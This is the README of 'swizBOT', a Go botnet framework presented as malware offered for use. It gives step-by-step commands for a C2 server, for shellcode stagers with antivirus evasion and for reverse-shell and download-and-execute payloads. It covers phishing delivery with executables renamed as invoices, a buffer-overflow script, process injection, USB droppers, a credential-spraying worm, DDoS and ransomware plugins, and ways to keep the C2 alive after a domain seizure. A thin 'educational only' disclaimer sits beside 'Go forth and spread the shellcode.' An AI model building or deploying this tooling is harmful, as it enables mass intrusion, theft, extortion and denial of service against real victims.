## swizBOT under testing...check back for updates...

# swizBOT — Church of Malware's Go Botnet Framework

 by: ek0ms savi0r
 
"We are Legion. We are already in your network."

swizBOT is a modular, shellcode-driven botnet framework written in Go, implementing Jake Swiz's revolutionary CALL/POP XOR decoder technique. It works on x86, x64, and ARM64 Windows (including Macs running Windows 11 via Prism emulation).

## DISCLAIMER
For educational purposes and authorized security testing only.

---

## Table of Contents

1. [Why This Exists](#why-this-exists)
2. [Features](#features)
3. [Propagation Vectors](#propagation-vectors)
4. [The Web UI](#the-web-ui)
5. [Quick Start](#quick-start)
6. [Installation](#installation)
7. [Building the C2 Server](#building-the-c2-server)
8. [Starting the C2 Server](#starting-the-c2-server)
9. [Creating Your First Payload](#creating-your-first-payload)
10. [Generating the Stager](#generating-the-stager)
11. [Compiling the Loader](#compiling-the-loader)
12. [Delivering to a Target](#delivering-to-a-target)
13. [Using the Web UI](#using-the-web-ui)
14. [Bot Connection Flow](#bot-connection-flow)
15. [Adding Custom Payloads](#adding-custom-payloads)
16. [Worm Module](#worm-module)
17. [C2 Redundancy](#c2-redundancy)
18. [Troubleshooting](#troubleshooting)
19. [Credits](#credits)
20. [Disclaimer](#disclaimer)

---

## Why This Exists

Most botnets die the moment they hit a modern Windows box with ASLR, DEP, or ARM emulation. Their shellcode crashes. Their C2 gets signatured. Their worms fail to spread.

Jake Swiz (0xXyc) figured out the fix. He dropped the knowledge publicly.

---

## Features

| Category | Capability |
|----------|-----------|
| Shellcode | Jake's CALL/POP XOR decoder (x86/x64/ARM64) |
| PEB Walking | Jakes Dynamically resolves WinAPI addresses |
| ASLR Bypass | Jakes Leaks libc addresses, builds ROP chains |
| Bot Client | Go-based, 2MB executable |
| Worm Module | 15+ propagation methods |
| Persistence | Registry, scheduled tasks, WMI |
| C2 Server | HTTPS + WebSocket, dark mode Web UI |
| Fallbacks | 11-layer redundancy (domains, Tor, DNS, P2P, Telegram) |
| Plugins | DDoS, ransomware, miner, reverse shell, keylogger |

---

## Propagation Vectors

The worm module spreads across 15+ attack vectors simultaneously:

| Vector | Method | Target |
|--------|--------|--------|
| SMB | Credential spraying + ADMIN$ deployment | Windows |
| RDP | Credential spraying + remote task scheduling | Windows |
| SSH | Brute force + key-based authentication | Linux/Unix |
| USB | Auto-run infection + hidden files + shortcut spoofing | Windows |
| Shared Drives | Network share infection + startup folder | Windows Networks |
| Web | Directory traversal + file upload + web shells | Web Servers |
| MySQL | Default credentials + UDF exploit | Databases |
| MSSQL | xp_cmdshell + PowerShell download cradle | SQL Server |
| PostgreSQL | COPY command to write web shells | PostgreSQL |
| Redis | Config rewrite to inject SSH keys | Redis Servers |
| MongoDB | Default admin credentials | MongoDB |
| Elasticsearch | Groovy script remote code execution | Elasticsearch |
| VNC | Default password spraying | VNC Servers |
| Log Files | Password harvesting from config files | All Systems |
| SSH Keys | Key theft + lateral movement | Linux/Unix |

The worm scans /24 subnets, checks all vulnerable ports in parallel, and deploys via the first successful method.

---

## The Web UI

swizBOT includes a dark mode Web UI that runs alongside the C2 server.

Access the Web UI: `http://localhost:8080`

What you can do from the Web UI:
- View all connected bots in real-time (WebSocket updates)
- Click on any bot to select it
- Send commands instantly with preset buttons
- Watch command output stream back to your browser
- See bot status (online/offline, OS, architecture, last seen)
- Broadcast commands to all bots with one click

---

## Quick Start

If you just want to see it work in 5 minutes:

```bash
# 1. Clone and build
git clone https://github.com/ekomsSavior/swizBOT
cd swizBOT
go mod init github.com/ekomsSavior/swizBOT
go get github.com/gorilla/websocket
go mod tidy

# 2. Generate SSL certificate
openssl req -x509 -newkey rsa:4096 -keyout server.key -out server.crt -days 365 -nodes -subj '/CN=localhost'

# 3. Build and run C2
go build -o c2_bin c2/main.go
./c2_bin

# 4. In another terminal, generate a test payload
msfvenom -p windows/exec CMD=calc.exe -f raw -o payloads/calc.bin

# 5. Generate stager
python3 stager/encoder.py payloads/calc.bin stager/shellcode.bin --loader

# 6. Compile loader
i686-w64-mingw32-gcc loader.c -o loader.exe -fno-stack-protector

# 7. Run loader.exe on any Windows machine
# 8. Watch calc.exe pop and the bot appear in the Web UI at http://localhost:8080
```

---

## Installation

### Clone the Repository

```bash
git clone https://github.com/ekomsSavior/swizBOT
cd swizBOT
```

### Install Dependencies (Kali Linux)

```bash
sudo apt-get update
sudo apt-get install -y golang mingw-w64 nasm python3 openssl
```

### Initialize Go Module

```bash
go mod init github.com/ekomsSavior/swizBOT
go get github.com/gorilla/websocket
go mod tidy
```

### Generate SSL Certificate (Required for C2)

The C2 server uses HTTPS on port 8443 for bot communication. Generate a self-signed certificate:

```bash
openssl req -x509 -newkey rsa:4096 -keyout server.key -out server.crt -days 365 -nodes -subj '/CN=localhost'
```

For production, replace with a real certificate from Let's Encrypt.

---

## Building the C2 Server

```bash
go build -o c2_bin c2/main.go
```

This creates a single binary with:
- HTTPS C2 server (port 8443) for bot communication
- HTTP Web UI server (port 8080) for your browser
- Embedded WebSocket for real-time updates
- No external dependencies needed at runtime

---

## Starting the C2 Server

```bash
./c2_bin
```

Expected output:

```
[+] Web UI running on http://localhost:8080
[+] Access from browser: http://your-server-ip:8080
[+] swizBOT C2 Server running on :8443
[+] Waiting for bot connections...
```

What's running:

| Port | Protocol | Purpose |
|------|----------|---------|
| 8080 | HTTP | Web UI (browser access) |
| 8443 | HTTPS | Bot C2 communication (requires SSL) |

Access the Web UI:
- Local: `http://localhost:8080`
- Remote: `http://your-kali-ip:8080`

The Web UI connects to the C2 server via WebSocket for real-time bot updates.

---

## Creating Your First Payload

The stager needs a raw payload to deliver. Here are examples:

### Example 1: Launch Calculator (Test)

```bash
msfvenom -p windows/exec CMD=calc.exe -f raw -o payloads/calc.bin
```

### Example 2: Reverse Shell

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_C2_IP LPORT=4444 -f raw -o payloads/shell.bin
```

### Example 3: Download and Execute Bot

Create a custom payload that downloads your full bot:

```bash
# First, compile your Go bot client to an executable
GOOS=windows GOARCH=amd64 CGO_ENABLED=0 go build -ldflags="-s -w -H=windowsgui" -o output/bot.exe client/*.go

# Host bot.exe on your C2 or a web server
# Then create a downloader payload
msfvenom -p windows/download_exec URL=http://YOUR_C2_IP:8080/bot.exe -f raw -o payloads/downloader.bin
```

### Example 4: MessageBox (Visual Confirmation)

```bash
msfvenom -p windows/messagebox TEXT="swizBOT Owned You" TITLE="Church of Malware" -f raw -o payloads/msgbox.bin
```

---

## Generating the Stager

The stager is the CALL/POP XOR decoder that wraps your payload. It decodes itself in memory and executes your payload.

### Basic XOR Encoding (Simple)

```bash
python3 stager/encoder.py payloads/calc.bin stager/shellcode.bin
```

Output:
```
[+] Payload: 196 bytes
[+] Encoding: XOR (safe key search)
[+] XOR key: 0x2f
[+] Decoder: Loop mode (26 bytes)
[+] Stager written to stager/shellcode.bin
[+] Total size: 222 bytes
[+] Ready for injection!
```

### LFSR Encoding (Polymorphic - Different Every Run)

```bash
python3 stager/encoder.py payloads/calc.bin stager/shellcode.bin --lfsr
```

Output:
```
[+] Payload: 196 bytes
[+] Encoding: LFSR (polymorphic)
[+] LFSR seed: 0xde7f3a9c
[+] Initial key: 0x9c
[+] Decoder: Loop mode (26 bytes)
[+] Stager written to stager/shellcode.bin
[+] Total size: 222 bytes
```

### Unrolled Decoder (No Loop Instruction - AV Evasion)

```bash
python3 stager/encoder.py payloads/calc.bin stager/shellcode.bin --noloop
```

Output:
```
[+] Payload: 196 bytes
[+] Encoding: XOR (safe key search)
[+] XOR key: 0x2f
[+] Decoder: Unrolled mode (no loop) (28 bytes)
[+] Stager written to stager/shellcode.bin
[+] Total size: 224 bytes
```

### Full Feature Set (LFSR + Unrolled + C Loader)

```bash
python3 stager/encoder.py payloads/calc.bin stager/shellcode.bin --lfsr --noloop --loader
```

Output:
```
[+] Payload: 196 bytes
[+] Encoding: LFSR (polymorphic)
[+] LFSR seed: 0x42a1f7e3
[+] Initial key: 0xe3
[+] Decoder: Unrolled mode (no loop) (28 bytes)
[+] Stager written to stager/shellcode.bin
[+] Total size: 224 bytes
[+] C loader written to loader.c
    Compile with:
    i686-w64-mingw32-gcc loader.c -o loader.exe -fno-stack-protector
```

---

## Compiling the Loader

The loader is an executable that contains the stager shellcode. When run, it allocates memory, copies the stager, and executes it.

### For 32-bit Windows Targets

```bash
i686-w64-mingw32-gcc loader.c -o loader.exe -fno-stack-protector
```

### For 64-bit Windows Targets

```bash
x86_64-w64-mingw32-gcc loader.c -o loader.exe -fno-stack-protector
```

### Reduce Size (Strip Debug Info)

```bash
i686-w64-mingw32-gcc loader.c -o loader.exe -s -fno-stack-protector -Os
```

### Make it GUI (No Console Window)

```bash
i686-w64-mingw32-gcc loader.c -o loader.exe -mwindows -s -fno-stack-protector
```

---

## Delivering to a Target

Now you have `loader.exe`. This is the file that turns a victim into a bot.

### Method 1: Phishing (Most Common)

Send `loader.exe` to a target and convince them to run it. Rename it to something innocent:

```bash
cp loader.exe "Invoice_2026.exe"
cp loader.exe "Update_Windows.exe"
cp loader.exe "Important_Document.exe"
```

### Method 2: Buffer Overflow Exploit

If you have a vulnerable service (like vulnserver), inject the raw stager:

```python
import socket

with open('stager/shellcode.bin', 'rb') as f:
    shellcode = f.read()

offset = b'A' * 2006
eip = b'\xaf\x11\x50\x62'  # JMP ESP address (change for your target)
nopsled = b'\x90' * 16

payload = offset + eip + nopsled + shellcode

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('192.168.1.100', 9999))
s.send(b'TRUN .' + payload + b'\r\n')
s.close()
```

### Method 3: PowerShell Injection

```powershell
$shellcode = [IO.File]::ReadAllBytes("stager\shellcode.bin")
$handle = [Win32]::OpenProcess(0x1F0FFF, $false, $pid)
$ptr = [Win32]::VirtualAllocEx($handle, 0, $shellcode.Length, 0x3000, 0x40)
[Win32]::WriteProcessMemory($handle, $ptr, $shellcode, $shellcode.Length, [ref]0)
[Win32]::CreateRemoteThread($handle, 0, 0, $ptr, 0, 0, 0)
```

### Method 4: USB Dropper

The worm automatically copies itself to USB drives. For manual deployment:

```bash
cp loader.exe "/media/usb/System_Volume_Information/svchost.exe"
cp loader.exe "/media/usb/Receipt.exe"
```

---

## Using the Web UI

Once your C2 is running, open your browser to `http://localhost:8080`

### The Interface

Left Panel - Bot List:
- Shows all connected bots with ID, OS, architecture, and last seen time
- Green dot = online (checked in within 60 seconds)
- Red dot = offline
- Click any bot to select it

Right Panel - Command Terminal:
- Dropdown to select command type (exec, ddos, download, worm, kill, miner, ransomware, shell, keylog)
- Input field for payload/command
- Send button
- Output area shows command results in real-time

Preset Buttons:
- `whoami` - Current user
- `ipconfig` - Network configuration
- `tasklist` - Running processes
- `UDP FLOOD` - Launch UDP DDoS
- `TCP FLOOD` - Launch TCP DDoS
- `ACTIVATE WORM` - Start spreading
- `DOWNLOAD` - Download and execute file
- `KILL BOT` - Self-destruct

### Sending Commands

1. Click on a bot in the left panel to select it
2. Select command type from dropdown
3. Enter payload (e.g., "whoami" for exec, "udp" for ddos, URL for download)
4. Click "SEND"
5. Watch the result appear in the output area

### Broadcasting to All Bots

To send a command to every connected bot, use the API endpoint with `bot_id=*`:

```bash
curl -k "https://localhost:8443/command?bot_id=*&cmd=exec&payload=whoami"
```

---

## Bot Connection Flow

When a bot runs, it attempts connections in this order:

```
1. Randomly shuffled HTTPS endpoints (5 domains)
         ↓ if all fail
2. Tor endpoints (if tor daemon running)
         ↓ if all fail
3. DNS TXT lookup (c2-directive.yourdomain.com)
         ↓ if fail
4. Peer-to-peer broadcast (UDP port 31337)
         ↓ if fail
5. Telegram dead drop channel
         ↓ if fail
6. Local cache + exponential backoff (1h max)
```

The bot continues retrying forever. If the primary C2 dies, it automatically fails over to backups.

---

## Adding Custom Payloads

### Step 1: Create Your Shellcode

Generate raw shellcode using msfvenom or write your own:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f raw -o payloads/reverse.bin
```

### Step 2: Encode with stager

```bash
python3 stager/encoder.py payloads/reverse.bin stager/shellcode.bin --lfsr --loader
```

### Step 3: Compile loader

```bash
i686-w64-mingw32-gcc loader.c -o payload.exe -fno-stack-protector
```

### Step 4: Deliver

Send `payload.exe` to your target.

### Step 5: Start Listener (for reverse shell)

```bash
nc -lvnp 4444
```

---

## Worm Module

The worm module spreads swizBOT across networks using 15+ propagation methods simultaneously.

### How It Works

1. Bot scans local /24 subnet for open ports (445, 3389, 22, 3306, 1433, etc.)
2. For each open port, attempts the appropriate exploit:
   - SMB: Credential spraying + ADMIN$ deployment
   - RDP: Credential spraying + remote task scheduling
   - SSH: Brute force + key-based authentication
   - Web: Directory traversal + file upload + web shells
   - Databases: Default credentials + UDF exploit
   - Redis: Config rewrite to inject SSH keys
   - Elasticsearch: Groovy script RCE
3. Also spreads via USB drives (autorun + hidden files + shortcut spoofing)
4. Also spreads via network shares and mapped drives
5. Also harvests passwords from log files and configs
6. On successful compromise, copies bot to target and executes
7. New bot repeats the entire process

### Activate Worm

From Web UI: Click "ACTIVATE WORM" preset button

Via API:
```bash
curl -k "https://localhost:8443/command?bot_id=DESKTOP-ABC&cmd=worm"
```

### Configure Worm Credentials

Edit `client/worm.go` to customize password lists:

```go
var commonPasswords = []string{
    "", "123456", "password", "admin", "Passw0rd",
    "Welcome1", "Password123", "Admin123", "qwerty",
}

var commonUsernames = []string{
    "Administrator", "admin", "user", "guest", "backup",
    "test", "root", "oracle", "postgres", "mysql", "sa",
}
```

### Configure Vulnerable Ports

Edit `client/worm.go` to customize target ports:

```go
var vulnerablePorts = map[string]string{
    "445":  "SMB",
    "3389": "RDP",
    "22":   "SSH",
    "3306": "MySQL",
    "1433": "MSSQL",
    "5432": "PostgreSQL",
    "6379": "Redis",
    "27017": "MongoDB",
    "9200": "Elasticsearch",
    "5900": "VNC",
}
```

---

## C2 Redundancy

### Configuring Your Own Endpoints

Edit `client/main.go` to change the hardcoded endpoints:

```go
var c2Endpoints = []string{
    "https://your-primary-c2.com:8443",
    "https://your-backup-c2.net:8443",
    "https://your-ip-address:8443",
}

var torEndpoints = []string{
    "http://your-onion.onion:8443",
}
```

### DNS TXT Record for Dynamic Updates

Add a TXT record to your domain:

```bash
c2-directive.yourdomain.com. 300 IN TXT "https://your-current-c2.com:8443"
```

Bots will query this periodically to get the latest C2 address.

### Emergency Domain Migration

If your primary domain gets seized:

```bash
nsupdate -k key.txt
> update add c2-directive.yourdomain.com 300 TXT "https://new-c2.secret.com:8443"
> send
```

Bots will pick up the new address within minutes.

---

## Troubleshooting

### "go: missing go.sum entry"

```bash
go mod download github.com/gorilla/websocket
go mod tidy
```

### "cannot find package" errors

```bash
go mod init github.com/ekomsSavior/swizBOT
go get github.com/gorilla/websocket
```

### SSL certificate not found

```bash
openssl req -x509 -newkey rsa:4096 -keyout server.key -out server.crt -days 365 -nodes -subj '/CN=localhost'
```

### Encoder says "No safe XOR key found"

Use LFSR encoding instead:
```bash
python3 stager/encoder.py payload.bin stager/shellcode.bin --lfsr
```

### Bot not appearing in Web UI

1. Check C2 is running: `netstat -tulnp | grep -E '8080|8443'`
2. Check bot can reach C2: `curl -k https://your-c2-ip:8443/list`
3. Check Windows Defender isn't blocking (add exclusion)
4. Verify SSL certificate is accepted

### Windows Defender catches loader.exe

Use LFSR + unrolled decoder:
```bash
python3 stager/encoder.py payload.bin stager/shellcode.bin --lfsr --noloop --loader
```

Re-encode each time for polymorphic output.

### Web UI not loading

Make sure you have the `c2/static/index.html` file. The C2 server embeds it using `//go:embed`. If missing, create the directory and file.

### Bot fails to phone home

Check bot can reach your C2:
- Try `ping` (ICMP may be blocked)
- Try `curl -k https://your-c2:8443/list` from the target machine
- Check firewall rules on C2 server
- Verify port 8443 is open: `ufw allow 8443`

### Worm not spreading

1. Verify worm is activated via Web UI or API
2. Check target has open ports (445, 3389, 22, etc.)
3. Verify credentials in commonPasswords list match target environment
4. Check network connectivity between bots
5. Review logs for specific error messages

---

## Credits

- Jake Swiz (0xXyc) — The brain. CALL/POP XOR decoder, PEB walking, ASLR bypass techniques. Brother in the Church of Malware.
- Church of Malware — https://churchofmalware.org
- ek0ms savi0r — Founder, Church of Malware. Packaging the scripture for the people.

Both Jake Swiz and ek0ms savi0r are members of churchofmalware.org.

### Jake Swiz's Work (The Foundation)

This framework would not exist without Jake's research. Go read his stuff. Learn from the best.

- GitHub: https://github.com/0xXyc
- Hacking Methodology: https://hacking.swizsecurity.com/hacking_methodology
- Swiz Security Protocol: https://protocol.swizsecurity.com
- YouTube: https://www.youtube.com/@JakeSwiz
- fukahi-na-tekio: https://github.com/0xXyc/fukahi-na-tekio
- CALL/POP Encoder: https://github.com/0xXyc/Fukahi-Teki0-XOR-CALL-POP-Encoder
- Process Injection: https://github.com/0xXyc/process-injection

---

## Disclaimer

THIS SOFTWARE IS PROVIDED FOR EDUCATIONAL AND AUTHORIZED SECURITY TESTING ONLY.

---

## Join the Church of Malware

- Website: https://churchofmalware.org
- GitHub: https://github.com/ekomsSavior
- GitHub: https://github.com/0xXyc
- Contact: 0x_k0ms@proton.me

We are Legion. We are already in your network.

---

## Malware Bless

Go forth and spread the shellcode.

— ek0ms savi0r, Founder, Church of Malware

Credit where it's due: Jake Swiz (0xXyc) did the hard part. I just wrapped it in Go, built a Web UI, wrote the docs, and added 15 propagation methods to the worm. Go follow him. Learn from him. He's one of the few elite hackers who actually shares knowledge instead of hoarding it.

That's the Church of Malware's whole mission. Open source. Open knowledge. Open gates.
